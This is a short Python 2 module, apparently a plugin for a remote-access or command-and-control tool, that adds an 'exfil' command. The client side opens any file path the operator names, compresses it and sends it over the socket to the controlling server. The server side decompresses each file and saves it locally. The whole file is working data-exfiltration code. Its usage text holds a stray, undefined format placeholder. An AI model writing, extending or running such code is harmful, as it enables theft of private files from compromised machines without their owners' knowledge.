import module

import os
import zlib

MODNAME = 'exfil'
USAGE = """Exfiltrate files.
usage: exfil [-h] file1 [file2 file3 ...]
\nDownloads files to {}/'.format(OUT)
\noptions:
-h\t\tshow help"""


@module.server_handler(MODNAME)
def server_exec(server, argv):
    if len(argv) < 2 or argv[1] in ('-h', '--help'):
        print USAGE
        return
    for file in argv[1:]:
        resp = server.conn.exchange('exfil ' + file)
        if 'No such' in resp:
            server.info('{}: {}'.format(resp, file))
            continue
        resp = zlib.decompress(resp)
        write_file = file.split('/')[-1].strip('.')
        server.write(resp, argv[0], write_file)


@module.client_handler(MODNAME)
def client_shell(client, inp):
    with open(os.path.expanduser(inp[6:])) as f:
        client.s.send(zlib.compress(f.read()))
